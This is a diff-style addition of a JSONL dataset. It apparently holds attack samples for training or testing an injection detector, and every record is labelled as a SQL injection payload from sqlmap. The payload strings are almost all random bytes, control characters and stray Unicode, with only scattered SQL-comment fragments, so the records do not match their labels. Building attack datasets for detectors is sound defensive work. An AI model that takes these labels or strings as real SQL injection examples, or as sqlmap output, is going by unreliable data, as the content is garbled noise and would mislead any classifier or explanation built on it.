+{"payload": "VT7:@\u000f\b衾^%d0\u0011t@\u001f9d<<<{Mfx\u0005]p̠#z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "h]~yf%D1Qvc \u0012Rl\u00153", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",⛕*U\u0012m\u0016~8\u0016]_fކj\u00165S;5Epo\"&F-*Vp\u0004\u0013\u0006)P\u0002k/I_\u0005k]764޵\u0013WRd4\u0016\u000f!&pT&--\u0015Il\t=6^إ\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ")S\u0001X7JX^~x%cc\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "3s\\L|N--T+L'\u0010$\u0019X2@V)=P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%0D", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "1\u0010%Cc]M/\u0013C\u0017\u001bʁ$l.\u0011Ve&ʭ)8j\u001fy( 7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001bY\u000f'jU.u\u001afҕj0>_ߦA7.}/.!}_\t--)>.<V^L]9fO\u0005GG\u0001-=\bVݮt4:'%1f.A\u0017U̩7OA?6\u0016qa0#]XaEA=G}O?\u000fg Zrؿ\u0003{T", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "j\u0017a_ZȄ{e\u0007K.}y--_ұ++^\u0004V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "& --/[\u0013![", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pC[\u000f[>9V4TmP\u0016Dg\u000eO>XnkY;tRU-%ag\u0014yt*ބӞ\u001bGAM ʁ&A--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0002@6T7MWX\t%d571\u00146鷌\u0000:\bx^\u0018½(\u00029\u0001o", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "KXS|\u0010p/!\u0010\u001bwNg[t--<\u0010\u0003\u000167?C\u0015|5Pdȿ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "g=nypCo\u0006\u0016ƝǮU$\u0005dzѪJ]rt\b3U3z\u0010V\u0005?d%6d`]8x", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[4@!wp\u000e--Qu~W\u0012\u0007&IOE:%Y_-q\tDOU\u0002Л", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}\u0005\u0010%71{V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7,k.oS--i־SD:C\"׫t\u0016wbU\u000e{zÙ%wݵ%\u0002\u0016Q\u00074UV=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "MS\u0013Q%aC_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000fB%7c\u0005\u001a7{׏YT*(Bl_\u0012\u0015#z徤Ȳ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001b>&ҧI--r\u0006+#|B#{^_F0\u000e\u0015wG\u00027j\u0019U/Q\u0003A\t\u0004=B*1fQhf&K\\\u0002yժ8ij", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007\u0013\u00198-\u0011~c%Dd*KmHOrq\u001fc$l,΀\bܩ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%2Ey\u0000j6", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "n=\u000e9TkEd$6\bgs\"\u000f_lr_%19Z`\u001f͑\u0017Zs@)A*Ԣ\u0004A]eb~P7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "z\u0004!t&\u001346h=DԬz--s\u0016ڹY.\u001b/I#Q", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "E\b\u0005*a\u0006%45D?zB\u001f[kYpOmj}/{M<I\u001272Ey<0r@)w\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "uiBj\u0019\u00012A\u0018[R,BkWf'5;ɏ\u0003'Q\u0005YI?#K\u0018; ڭ\u0006Eo%d4VmE\u0018E", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "a\u0004\u0002n--GKCJynI3Ã?rǝn1b\u0012ҁ@/`ICk\b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "BS!u%8FEY=CPgsׇKX?]JB3(J\u0001}\u0004m\u0014$\u001f\u0005", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ϻdO\u0013ϻ_=6ͻCai$t]hȜ\u000f\u0018=w\u0001\u001f7\u0012mHg!H%E1.\u0007/tҜ\u001a\u00043oN\u0007ʘ3Jy\u001fZ@i\u000fo\"z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "^@P\u0003fp4\u0001n9dI~:~Sx\"Qۘ\u0016\u0013͏9'\\^Oԥ\u001f--\u001f#`e\bgH#AOL\u0000z\u0017\u001aȨ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "|Ѳ&\u0016qVI$薖7\u0014--2Zx\u0013e\\\u0004MqB*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0_:\u0011%bC\u0017\u0015\u0015K\u001b:\u000e>hX@!q\u0006\u001bj\u0013ڹ\u0002#L[۾r;Tf\u0002p/QWƐ\u000f-<pC", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003<<\u000f\u0003Hn'F--gin\u0016֡\u0019\u0002Xo5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",\"\u0005Rb\b\"\u0001 ?9E@sr9gٌ\u0019ph\"d>B?9W\u0019%8C(\u0019ޜ;4ʏc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "a5#e7%d0\u0002(ٔ\u0005Z\\5#b\"#SD0(p\u0006(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000e|tg/<!7wо9zew0Ͳ+{b\u001fwo|\u001a.P*&VcbZ$.S4\u0007\u00051e}\u0018HLȞ:--0)£S", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "sE}C!Yka\u00184\u0002\u0001/*ϮϦ\u0012B+пpgpE\u00065&!%\u0015_zd%c8&EG'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'\u0019'q$n\u001a\u0010r\u0019#\u0007i\u000ee2\u001b\u0006\u0002|eDG\u0019'[/cʄ2%60O@\u0019~B5\u0016\u0000BBzN}2\u0010q<P͵\u0005\u0016l 7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "^6=\"\u000e---)[6ut<\u0010-\u0015\u0016f@\u001bMw+Gax\u0015X=w\u0003ۣc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$\u000e\u0007CZaG2\u0012(ɧ\u0018\u0012tNxX%9F\u0007M", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ko/4w\u000e--\u000eb", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i\u001f7\u0004'n^c%FC\u0004IDiD", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?--Z\u00153=V5,K\u0005l", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "MW %:\u0011R\u0000l#+e<-\u0000e!%99!\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i\t^*%89-Șǥ\"~˅-~\u0000>mq\u0019xS", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007:lihDG?'___[iTf\"*33_fU$7zS=-`I-uJ\u0002%BfXTm+p'\u0003/Kg2΄;\u001b{%K\"\u0004v\u0007{HMB,蜞=\b@SW= ʴʈ4Z;XB\u0000Ac\u0012Gi9Ǟ]NS-:qgp-Y|\\Uhp:9ǾJJ\u0012U\u001a˷緫", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@+0IϜ÷+\u0018s7:+ϴ=uI\u000e8cVK%aC", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%cdwR\u0015\u0005USƀ?N\u00182\u0011\u0014-$v<'E%Ȕy\u001aN\u0013\u0013\u0000Ϯt/F\u0017P^ok%65U?\u0004N*zs*(m\u001aBK\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "yOAd\u0004\bMvlv=\u0004$%abI\të|\u0011䘰iw0z'F,F\b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "v\u0010\u0000jwF?hA\"89>\u0019q[\u0002!N\u0006*\u000e\u000e%fBڙ (\u0014\u001aZ\u0011bm-\t5Js*G\u001b3m\u0004Efר)0e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7\u0005P,=QЅ\u001f\b\u0012og@PuP\"eS%,1FaKN\u0003~t,o3\u0006:\u0003\u0013q\u0004 z\u00066X)\b7t^7=Ǝ\u00041\u0015ͤ\u0017\u0016PZaۙ!D\u001bc'1Kdg{<_\u0002vV\u0005[.|\u0001\u0005'ϡ\u0007.{\u001b\u0007\u0006\u0002J <tNh\\&)f,X\"<ANGvJ\u00041s\u0014hozg\"%8a`M,", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i\u001f\b|\u001fC΁ՇU\u0014rr#!}m<\u0002]=AP$it8%4f8&69\u0003AT5~un(1Qf\u0017 m\"{gdwם>NFd&\u000e\u0011W5\u0005J\u000fNNN$m,٬7|!\u0004*%/\u0013vG", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(س\u0015R=X<T\t5IKݗڼ--Է\"Qzk\\[AD\u000eR6\u0007d/", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007$ʫ\u0017V>\u0010YBD p#n\u0007\u0002%-L(\u0013\u0012喒\u0017)ʬtNsD&r\u0014\u0013Ø }\u000f5q\u0016\u0013\u0006\u0004\u0015&T]W.nA\u0005?\u0002ƹ:`@u'`y<)\u0013\u0016qƒ,U%OJҬCRQw\u0019E^y\u0002%EFf\u0018M|fŏ\u0007nWCՕv\u000e\u001fof9z&3\\\u0012]1", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "kEC[<\u0002\u00031\u0011%6C~c~FöSF\u0003KQ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "y\t1\u000fi\u0017\u00146--8\tNj\u0003\u0003\bfkeTk\u0016[_\u0014KΆzܪ&c8 ,*\u0014\u0006`#btɇ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0004-Б%C7t\u0001pE]B6p/R\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "a\u001f%37`\u0010>xf_t\b`AZo>\"SjϞ\u0002\u0005-1WIFىk2ŬTu\u000eSrt%.\u000e\u0018=\"mj,S/a0A5UY", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "9i$k6\tї9FCxqxA\u0001\u0010%:,*%9am1\u00155`\u0013-f\\h,xF\bҸ`bz[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}~%bC/\"\u001fB\u0017/N~", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "V--ۯ))oGh", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ky=Y\u000en\u0016G\u000fq׎׃fb\u000f\u0003k+\u000f#KNSJaZi\u001aI%34\u000e,D", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(n,%Aci\u0000ԟaR_\u0000\u0018\u0015¡hias\u000f\\Ы1ܠ\u0007e~xQ^G4h#>W\u001bK3۸XB۱i&{0Wo1lB1<W8z0E\u00059_[\u0010^a7<㬑z\u000eM=^\u001b\u0017WR4h^]ux]ΪO'}\u001fs_6\u0006[@<]2", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%b0\u001fg%\u001aA\u0005dh٨ZJziQ}?\u0018", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "g%78ɚ\u00127We\u000f`\\IA\u0005%", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016:7:T%c8", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "L\u0016\u0011 dPҟ8\u0018\u001aU\u0002ֺ毙Q_V. g\u00012F~KSZiY̪L%F6x[\tн:Q)J WuWגm;3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "U$9l>\u0010>G5\u0018%06h\u0011", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "^Y\u0011\u0002I>_őM P\u001a{ʃ^\u0014\u0002G\u0007z%K\u0000\u0006Gq{Fj6:%18\u0018mN}r3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "24]#\u001a巕/9W*E0˯q\\̉S3 hφ\u0013\u0005ha1<%348JDR", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "df>ﴘ\u0007Ou:H~+9\u001b-KܻU[z'ޡ[u|`$\u000e\u0002\u0019_%dbӶTmf\u0005T", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "KP}\u0004\u0005Af_Ioq$\u0019`\u0004\u000ehӱڸlMD\"W\\P.\t\u0011m*t\u0014]f>VBq:}yYzn4f5m\u0007@y\u0003A>Fh[\u0011ojjkX>d7%!\u0017{?rI(A\u0003P?35I\u00130i\u0001s6b\u000fPFƇZ&IkxN\u0011%fEMܪ\u0000I\u001fGC+]٤TT*M).\u00199әSw\u0000\u0007r]ȃ(\u0014*]Z/䜴:", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "b|5|I4ē'@W\"ܦ\u0007'--@pR8P+\u0019\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(S0PfH`\u00169ΒM@P\u0002[\u0003{\u0003.EdAJW\u0002˩%6B*6\u0016n\u0015", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",nW|$nc\"$'\te{:턳7 \u0005P\u0006%54IVvYn\"]\u000eZ\\S)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "~TmƧuC%38CN\u0016FhR9\bTJ؊@i\u0013", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "kcqF;V;--{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ɂ\u0006cq2\u0015֜\u00031.UuI#,FK)4vrro\"\u0001<]i\u0005\u0007}]g4I{%eKH? ѐ`a%67n|e&ġ~JyiU\tWh\u0001gMe甖|]]K:7\u0012F}mOj+_y(59U%^ܪ\u0018vM\u0012-:\u00164r#.\u0005", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "nO\u001b}c-\u001a\u0006qj'\u0002;--k4۶jQ\\=\u001b8y\u000ei\u0017\u0018([بYgZliS\u0002~^n\u001bŌg", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005--n", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "J}\u0011NXMb#q\u0015F%F8}hyO?5<", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "4\u0007rE%A9>SzA,sRI;Un\u0018\b\u0007ÿ\u0005CF", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "E:\u0003≣--6WoY\u001f10kEovw٬\">+b^Qne{,T:6\u0004XIqn\u001fS9f$\u001a\u0015(o\u0013*ȝ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\tt\u0001|w\u000e%F9\\;:>A\u0003\"RO?\u0018JS", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "M\u0003\u001aM\u001al%[v\u0002\u0002O\u001a»]\u0012ě~oÛEx廡wC*+15KKs\u0013W\u0004Ւqe|=?\u001a\"o%7C=ѕ\u0007lkejLi4SJEg(wSڂ^c8c", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "f!raZ--8Q, $!rE&\u0001\u0001\u0006N!\u0000Qt4v[\bd~g2S\u001f7Ǖ}^ >'\"", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(\tV\u001b^TJ3\u0007\u001b\u0002~x\u0002+ԖVF\u0018Je\u0000K%1A\"u\t\u0018\u0015$\u0002Rhe^`x", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "K\u0018}\u00015~%fE[Gڹ=Fy~X\u0019|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0001mx%DA\u001b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000e;_wթRwe$»(\u001fUى\tT,]m\u0019NP\u0001\u001fb\u0012bR(\u000e\u0016o4\u0019O:̀wy%ecV^E)k+\u0002\u001f9\u0004Q", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[.+\u0010o %bA#@-X;|\u0011{k\u0012^U", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0011HC1:--7\u001aŵo\u0015N\t~HI=k<gW\u0014", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "nc\u0016t3`%d220Ӵ_t\u000f\u0001fT\u0016ܢUT\u000f\u0011Y\"??j5*tFZ4s\u0016Q,N", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Lk\u0000P1.\u0004F!%F5>j", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0017\t>ڰ\u0012*īrR--ߒ*\u0012\u001f\tϥt~K2R", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "z?P2\u0001xyivҹ=T͈6K׈\u0003`/\u001bDtX{--Y0_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Fk竾\u0015Ɠ\b\u0017ͦԽ6ufk%62aãnNOzZt", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000f^r\t\"􈜹\u0016Y%\u0001\u0016xHo둨qTK\u0015N}OM0`)%50Ea\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$\t\u0006Wڏ--Tr0\b\tj7COlb_^mE[\u0003Xۗ\u001af", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007\u0012%d0,\u000f\u0016'\\", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "u\u0016P7J,%9f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "mc\u001bc1*)\u0001Sc\u001a\u0011X_'\u0017։4\u001a٠ƶG\u0013I\u001aPګ1\"RF\u0014JpX\u0001@&\tgRzӋ\u000fp^VFl(\u0012\u0007\u00023\u0007`L >6r\u001baf-~9ż\u0015|)\u0003B٠@SO놺fgKs--JB\u0007fB{͍\u0014C2ɟ\u0013\u0014;7ԱN\u0007\\\b\u0011r9,b\u0004ō/\u0001\\\b`F\u000eN\u0014Z\u0002vԳ:BY\u0011+l)Q\u0004H\",\u000e\u0005CrXD9:gV˂H*\u000f\u0004\u0010^z%Rd\u00012D\u0019XF\u0012[Fk\u0010]\u000eC%(ё\u0000\\P)).uSwn\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u00178η%ef~\u0017]Z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&d0pu˴b-rL.iN\\\u0016+\\6\u0007+\\6Hr8%9A\u0018{KEggre{Jg\u0018g,wo\tn", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "bڒ\u0017v.%i\\%0.\u0005\\j!!T7י9\u0005iX%F0\u0003V\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$Q\u0001D%EAD", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005\u0014?Rj8VlH\u000e(ɹ:--e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<\u0005Me\u0004%DcL5:hƑäxH\u0012-", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "]Sj{%&S.{\u0005\u0018---\u001b\u0016)m{ADs\u0000\u0003F\u0016ZF~PqV!@ӖZ[E?S$V=\";5C)\u0005\u001bQkpL\u000f^Y09w\u00024˳&Įp\u00000Q\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "S\u0015Uhv+5\u0015%b3,Nm\u0000e\u000fj$\"\u0019 ޘ\t9zdu;\u0001\u00189z5Q<?^,2db\"/~\u0004", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001bpk*%3F", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "E^\u000elc\u0007>\u0006\u001f\u0011?\u0018;nLF{^@ivݑđL>>ըfnbP&ɤ5Pdv`-u&+!\u0004R>/9>+}\u001a\u0014'!=:%ear.У\u0004\"\u001bLNJ:ޗip\u0014D]&눷E\u0006wc@\u0017*9", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "kMz\b\u000fL6!K^\u0014\u0017arK\\_K--Ru#", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016{86dD%46O\u0007\\%\u00106\u0006", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "6xi\u0004dL\u0003凣'\u0013Ǉ2sKjv\u001fζtg[?8OG\u0005ow\u001fptmz\tG\u0001-yǼHŖ2̱+\u000fC\u0011GD[n-\u001fŖ--}\u0001P\u001fU`KqG-\u0011.\u001f\u0001oi=o:oI(\u00164\u000e'\u0001+\u001f\u0010[oT&\u0010dUh\u001b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "fy28;\u0010((v`*`w!~UJg%4CC]I\u0017غN;G\u0015Ǔ.>\ty<", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[~Lb+S z.mҧ\"m)\u0014P&^\u0002{[viH\u0018F3\u001b--}c8㺈6lްbX$\u0002qے\".)\u0019mk}\\c", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">L&+{Q\u0018џ|K-aǧo\u0005%AEZ\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "; \u0010tƄ\u0004\u0018M+\u0005z\u0003Q\u0015\u0005\u0011\tX0&1\u0011h${VǪ09VO+sK_a)Uk2_&Uk\u0012_e\u000fwbo*\u0005Z1-\u0007T/\u0011Z+Lt\u0013S\b~%c5+\u0014EN5EL\te\u0018)<!\u001fKEE\u0014", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "mp\u00116|fY@Ё%35Bj\u000e\u0017=7tys", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "x\u0013_72\\\u0014zFh֜d܌\u0018UqK0Z~=\u0005\"\u001f\u0005A\"h\u0005ac\u0019d\u0015RS\u0000ڨ-^Bl$:H--GP1\u0000W}̍z\u0003M\u0004\u0016\u000f5ƍ1DiiL\u001bPcځ\u001a\u0016.F\u0010NV,'j\u001bۘѷ91ǯq`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "z4]}3h\"$Gή\\6\u0006KkϭÙ@88s\u00059 \b65\u0000R6\u00056%80bO`otТ^M \u000f`\u0017\u000e~\u000ef", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(2\bv>5\u001ayJ%BE `ʼx\u001a\u0016\u0002+1YLʜnA<[ɋA", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@ \u0016V\u00059--7-w->=U\u0002o<C\\\bJdZ\u0011AYkV\u001fj-=\u000141AŎB6\u0004$42)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "W<&%2b1&FѴJ'2=%@IO<\u000fEZy]$nP", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000fF0+n\u0013\u001b\u001bν7m<C\u0011 u\\\u0018+%09(\u0017Ѩ\u0001Ub8", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "U%z\u0014m\"?c-+S\u000e*r00IOFgq\tYkX_=qI\u0019w2'TddP9d\u0000\u00048%49%]-貍@7uU\u0002", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "|hN.\u0010쒵ΑE}ra\u0005ݛ\u0002)y}__-}'oraaHl", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "nqq[{9:%7f\u0007\u0003\u0016t!\bnj;N-fw\u0011f\u0016[\b;M,F!s9\u0018@Of&T\u000f\u0005u\"", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "t3B%5Fdo~F\u0014(\u0001(l", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "x07\u0001\u001fÉ7a\u0006ݮ\u0019\u0001\u0007%9cB\u0017\u0007\tXff6#\u001f2\u001b2S/r\u0013F}*^Օ{9\u001b2_\u0000(7\u0012~p\u0014guV)_G", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ڝ|Sz%c\u001bC[yg:\u000epV:%A5t+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "+?\u0005vkDGi\u0001Il]ܷF|\u0000yG\\Ρ~kQﲣ\u001a!hO%Fe@mÉ?qdt\u0004#\u0014q\"֮", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(Z\u000e\u001a|\u0001G\u0012U#\u000fTë<Ty\u0013%1FP,", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\"nl(gYZU\u001b/ǀl17t6YY--\u0010?<OMTHf0\u0010.θL`z}ϙbzMsVh!*\u00157\u0014D)\u0000aj,ܬ6̢*5Q$", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Mr\u0002\\i\u0004jr{\u0017D%23iU*O\u0015檟Jb[\u0016`ȱKEun3P\u0013\u000eWD\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "2/zS78m/'--S\u0016D\u0000A8Z,],\u000f\"`\u0012\u0006W,\u001avx", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m!CT@Ž<Li(&cWt\u001fo0\u00046 3\u001bBu {\u0001\u0019Dt\\Tu|>SJwd\\.4T2X\u001b\tO2Sc\u0017:Cv\u0013eADG\u001bU?%d23P^fP%õlEH^\u00143\u0002", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@@w\u0001\u000ezfk\bɡ\u000e\u0001/ۼQм&[mU9\u001b--gUe\u0018\u001fcUIXA\u0004 m\u0004{E\u000e%m2Z\\A=zM\\\"}ܘ'lF-\u0016mG", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "F40aF\u0012WR{&<=+%D8V| #HpVW^\"EvF\u000f\u0010!Oq:Y\u0002#~#O0/Amx(c\u001bt{\u000fu\u0013f\u0000l", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "x.\"_]ie\\W\u0004\u000f{)4^\\N\u0016%2fEO\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "P\u0007\\6l.]?@\u001bh7ț5éog- x\u0006\u0007Q\\.rѷT|I\u0003\u0003 H\u0001^%A4n\u0003\u0017^.H2\b\bw@1K@cvs\u0003K|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}U\"c=~\u0007ٶA\u0003;\u0005[+\u0015\u001fLTr\u0012--\u0001(!\u0003(*N\u0005rMd.b%f_\u0006P!B\u00132\u0014bg", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "1^?RNDzZ`&s\u0006>H%2CT\tҨDRC{Q{*J:v)4\u0003/\u001a+\u0001n#", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007K)q\u0011}zs/M+g+gkΏ2E_4rR\u0007@A\tj\u0002ߦ馔\u0017\u0012\tI%24v\u0010Ȓj8'o}AfWP@t\u0010\u0012 *`\u001a\u0005i$", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "D#H#Qݼj,}\"c\u0003%A3>n\u0013\t\u001bv\u0013J\u0017(&\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Na7P%de\u0004tr\u001a*e\u0014\u0018G#J=\b}7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i3uSX+^^_&gzg\u0019%fB'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ײ\u000e?XȵaitU\u0004\\<2n9\u0010dy]K`̸~rlyx?\u0013\u0000'\u001fBfb[a¼\u0017'42\u0000-V%Cbhg", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%3DW4-\u0019\"\tsaq0;6zy^M", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001a&RCs[z%d2#\u000f\u0017Jk\u0003\u0000T\u001av[#\tZ\u0002Pobn̥F}-", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "d?@8\u0014,Pb?j0y8\u0000Q}\u0007x\t1ܳ-\u0015S8]&\b\u001aT;{Lɋa%b0\u0015`\"Y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0006\u0007\u000fX\u0016\u001f\u0004\u0019@}`HK\u001bh--6q\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "8}*\u0001\u0010O]ֿan\u0019\u0005{gy}4xY%52qҁ]/VcVXFXB@2\u0002T\u001a\t\u0001K\u0013>拐\u0010FDyńQx1", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[æ9R\u0000<.\u001f\u0000MHGϗ\u0005\u0016!'uzKz]U.%SH\u001fǖ`p\u0001pН%Ea\u001az(\u0002\u00011\u0001w\\\u0005jTX@yWlWc\u000fK$2\u0016\u001a2>", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?\u0019eY[\u0019?0\u0004T;\t$Na\u00025,e/0Q1tUISombk.FZ psӐjHo\u0017y\u0002YBzqE@tmR-h\\'KU/--|0ֆ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o\u000eke\u0014h{\u0018{ݠ傦z\u0003u--4|j\u0018/\u0018)MG<7KO+8\u0018y1\b]i\u0019I7m'*ˬe8ka\u001fLMf\u0012hܲkN.iMr\u0015 '8\"nvIBx$FS*ڭT\u000f9Hڻmӹ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "{8%3DG\u0003FkJG*>RVH@;3 g", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ssgtiEL\u0000zlBס1U|m\u0001!T\"\u000e|%5a[:*/*.4TyfXӁ\u0000G;_nU$\u0002kS50peY⪾d񗊻iU\"b\u0017-J[g\u0001o\u0007b\u0018&rҬװpd0", "attack_type": "SQLi", "source": "sqlmap"}
